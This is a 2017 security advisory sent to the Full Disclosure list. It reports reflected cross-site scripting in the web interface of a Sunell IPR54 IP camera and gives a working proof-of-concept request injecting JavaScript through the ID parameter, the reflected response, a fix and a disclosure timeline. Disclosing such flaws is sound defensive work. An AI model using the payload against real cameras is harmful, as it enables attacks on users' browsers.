
Date: Wed, 24 May 2017 14:36:25 +0000
From: Advisories <advisories@...pass-security.com>
To: "bugtraq@...urityfocus.com" <bugtraq@...urityfocus.com>,
 "bugs@...uritytracker.com" <bugs@...uritytracker.com>,
 "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
Subject: [FD] Sunell IPR54/14AKDN(II)/13 IP Camera - Reflected Cross-Site
 Scripting

#############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/research/advisories/
#
#############################################################
#
# Product:  Sunell IPCAMERA IPR54/14AKDN(II)/13 [1]
# Vendor:   Shenzhen Sunell Technology Corporation
# CSNC ID: CSNC-2017-010
# Subject:  Reflected Cross-Site Scripting
# Risk:       High
# Effect:    Remotely exploitable
# Author:   Stephan Sekula <stephan.sekula@...pass-security.com>
# Date:      18.04.2017
#
#############################################################

Introduction:
-------------
Sunell's IPR54/14AKDN(II)/13 is an all-in-one Bullet camera designed for indoor
and outdoor applications. Equipped with a 2MP sensor enabling viewing
resolution of 1920*1080 at a smooth 30fps.The camera is capable of capturing
high quality video at high resolution of up to 2MP even in low light environments. [1]

Compass Security discovered a web application security flaw in the camera's
web interface, which allows an attacker to manipulate the resulting website.
This allows, for instance, attacking the user's browser or redirecting the
user to a phishing website. In order to do so, the attacker only needs to forge a
malicious link.


Affected:
---------
Vulnerable:
 * v2.0.0801.1002.1.1.136.0.0


Technical Description
---------------------
The camera's web interface uses an ID parameter, which can be manipulated.
If this parameter contains JavaScript code, it is executed in the user's
browser. Exploiting the vulnerability will lead to so-called Cross-Site
Scripting (XSS), allowing the execution of JavaScript in the context of
the victim.

Request:
GET /asppage/common/index.asp?ID=59581";alert(0);"&lg=1 HTTP/1.1
Host: 192.168.0.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0 Iceweasel/44.0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: coobjMenuTree=; csobjMenuTree=OperationLog
Connection: close

Response:
HTTP/1.0 200 OK
Server: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN
Cache-Control: max-age=180
Content-type: text/html

[CUT]
<html>
<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
<title>IP Camera</title>
[CUT]
<script language=javascript>
                                                         vID = "59581";alert(0);"";vHasRefererFlag="0";
                                                         </script>

[CUT]
</html>


Workaround / Fix:
-----------------
This issue can be fixed by properly encoding all output, which is posted back
to the user. For instance, using HTML encoding, to convert < to &lt; and > to &gt;.


Timeline:
---------
2017-05-18:     Public disclosure date
2017-04-18:     Vendor notification (No response)
2017-03-22:     Initial vendor notification (No response)
2017-03-22:     Discovery by Stephan Sekula


References:
-----------
[1] http://www.sunellsecurity.com

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
